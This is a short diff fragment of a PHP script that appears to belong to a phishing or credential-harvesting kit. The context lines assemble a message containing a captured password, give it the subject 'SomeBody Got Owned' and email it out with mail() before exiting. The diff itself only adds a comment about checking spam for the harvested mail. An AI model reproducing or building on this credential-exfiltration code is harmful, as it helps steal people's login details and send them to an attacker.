@@ -20,5 +20,6 @@ Password :- $var2";
 $subject = "SomeBody Got Owned";
 mail($to,$subject,$txt,$headers);
 exit();
+//validmail address entered yet not got access chexck in spam.
 ?>
 
